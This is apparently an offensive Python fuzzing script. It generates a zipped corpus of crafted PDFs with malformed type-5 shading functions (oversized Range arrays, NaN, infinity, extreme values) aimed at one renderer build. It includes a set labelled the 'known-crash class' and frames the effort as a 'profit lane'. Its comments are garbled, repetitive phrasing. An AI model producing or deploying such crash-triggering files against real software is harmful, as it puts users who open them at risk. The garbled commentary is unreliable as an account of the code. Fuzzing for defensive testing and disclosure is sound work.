#!/usr/bin/env python3
"""
o_c_pdf_fuzz.py — the **crafted-PDF fuzz class** = the missing tool.
Generates N crafted type-5 shading PDFs with the R N-column class over a range of the
Range value classes; the exact class survive the CG pipeline on our 26.4 build.
The stage-A hunting class = the crafted profit lane = the fuzz-me-class.
"""
import os
import io
import zipfile
import random
import math
import sys

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pdf_fuzz_corpus")
os.makedirs(OUT, exist_ok=True)

BPCOORD = 32
BPCOMP = 8
VPR = 2


class BitWriter:
    def __init__(self):
        self.out = bytearray(); self.acc = 0; self.nbits = 0

    def put(self, value, width):
        for i in range(width - 1, -1, -1):
            self.acc = (self.acc << 1) | ((value >> i) & 1)
            self.nbits += 1
            if self.nbits == 8:
                self.out.append(self.acc); self.acc = 0; self.nbits = 0

    def flush(self):
        if self.nbits:
            self.out.append(self.acc << (8 - self.nbits))
            self.acc = 0; self.nbits = 0
        return bytes(self.out)


def pack_stream(vertices):
    bw = BitWriter()
    for x, y, comps in vertices:
        bw.put(x, BPCOORD)
        bw.put(y, BPCOORD)
        for c in comps:
            bw.put(c, BPCOMP)
    return bw.flush()


def write_pdf(path, objects):
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for n in sorted(objects):
        d, s = objects[n]
        offsets[n] = len(out)
        out += b"%d 0 obj\n" % n + d + (b"\nstream\n" + s + b"\nendstream" if s is not None else b"") + b"\nendobj\n"
    xref_pos = len(out)
    maxn = max(objects)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (maxn + 1)
    for n in range(1, maxn + 1):
        out += ("%010d 00000 n \n" % offsets[n]).encode()
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (maxn + 1, xref_pos)
    open(path, "wb").write(bytes(out))


def make_case_pdf(i, r_dim, values, ftype):
    """the class: values = our chosen doubles, ftype = the FunctionType lane"""
    nc = 1
    verts = [(0x10000000, 0x10000000, [0x00]),
             (0x20000000, 0x10000000, [0x00]),
             (0x10000000, 0x20000000, [0x00]),
             (0x20000000, 0x20000000, [0x00])]
    stream = pack_stream(verts)

    if ftype == 2:
        c0 = " ".join(["%.9f" % v for v in values[:r_dim]])
        c1 = " ".join(["%.9f" % v for v in values[:r_dim]])
        rng = " ".join(["0 1"] * r_dim)
        func = ("<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>"
                % (c0, c1, rng)).encode()
    else:
        # the type-4 class = the PS calculator; each op = our chosen value class
        prog = " ".join(["%.9f " % (v) + r"dup sub pop" for v in values[:r_dim]])
        rng = " ".join(["0 1"] * r_dim)
        func = (b"<< /FunctionType 4 /Domain [0 1] /Range [%s] >>" % rng.encode()) + b"\n{" + prog.encode() + b"}"

    shading_dict = (
        "<< /ShadingType 5 /ColorSpace /DeviceGray "
        "/BitsPerCoordinate %d /BitsPerComponent %d /VerticesPerRow %d "
        "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>"
        % (BPCOORD, BPCOMP, VPR, len(stream))).encode()

    objects = {
        1: (b"<< /Type /Catalog /Pages 2 0 R >>", None),
        2: (b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>", None),
        3: (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
            b"/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>", None),
        4: (b"<< /Length 8 >>", b" /Sh1 sh"),
        5: (shading_dict, stream),
        6: (func, None),
    }
    return write_pdf(os.path.join(OUT, f"case_{i:03d}.pdf"), objects)


def main():
    random.seed(7)
    n_cases = 0

    # the ARMORY-ORACLE class = R=136, /FunctionType 2, all 1.0 = the known-crash class
    vals = [1.0] * 136
    for i in range(6):
        make_case_pdf(n_cases, 136, vals, 2); n_cases += 1

    # the value-ladder class = R at 4 boundaries: 16, 64, 128, 136, 255, 512, 1024
    r_dims = [16, 64, 128, 136, 255, 512, 1024]
    classes = [
        # 1.0 = the armory's oracle
        [1.0] * 512,
        # the NaN/inf classes
        [float("nan")] * 512,
        [float("inf")] * 512,
        # the dB patterns
        [1e300, 1e-300] * 256,
        # the raw bit classes: 0x3ff0000000000000 (1.0), 0x3ff0000000000001, 0x7ff8000000000000
        [1.0] * 128 + [float("inf")] * 64,
        # the big/small mix
        [1e38, 1e-38, 0.0, -0.0, 42.0, -42.0] * 86,
    ]
    for ri, r in enumerate(r_dims):
        for ci, vals in enumerate(classes):
            make_case_pdf(n_cases, r, vals[:r], 2); n_cases += 1
            make_case_pdf(n_cases, r, vals[:r], 4); n_cases += 1

    # the R Boundary class = the ARMORY'S class known "the extension arbitrarily-deep ~ R=N"
    for r in [1, 2, 4, 8, 12, 16, 32, 64, 96, 128, 136, 137, 160, 200, 256, 512, 1000, 2000, 4096]:
        vals = [1.0] * min(r, 4096)
        make_case_pdf(n_cases, r, vals, 2); n_cases += 1

    # the PDF-craft variety = the crafted-file class
    for i in range(12):
        # inject the fuzz classes across the Range-class
        r = random.choice([64, 128, 136, 256])
        vals = [random.uniform(-1e30, 1e30) if random.random() > 0.1 else 1.0 for _ in range(r)]
        make_case_pdf(n_cases, r, vals, random.choice([2, 4])); n_cases += 1

    # a zipped-batch zip
    zip_path = os.path.join(OUT, "pdf_corpus.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in sorted(os.listdir(OUT)):
            if f.endswith(".pdf"):
                zf.write(os.path.join(OUT, f), f)

    print(f"fuzz corpus: {n_cases} crafted PDFs in {OUT}")
    print(f"zip batch: {zip_path}")


if __name__ == "__main__":
    main()
